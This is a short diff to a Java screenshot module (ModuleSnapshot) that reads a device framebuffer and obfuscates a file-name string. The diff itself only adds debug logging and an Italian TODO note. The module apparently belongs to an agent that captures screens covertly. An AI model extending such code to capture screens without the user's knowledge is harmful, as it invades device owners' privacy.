@@ -144,6 +144,11 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 			}
 
+			if(!frameBuffer && ! screenCap){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart) Screenshot not supported");
+				}
+			}
 		} catch (final Exception ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(ex);
@@ -281,6 +286,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (frameBufferMethod): all black");
 					}
+					// TODO: aggiungere (una volta sola) un log info
 					return false;
 				}
 				if (usesInvertedColors()) {
@@ -472,6 +478,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 			final AutoFile file = new AutoFile(path, M.e("frame")); //$NON-NLS-1$
 
 			if (file.exists()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getRawBitmap) file exists: " + file);
+				}
 				return file.read();
 			}
 		} catch (Exception e) {
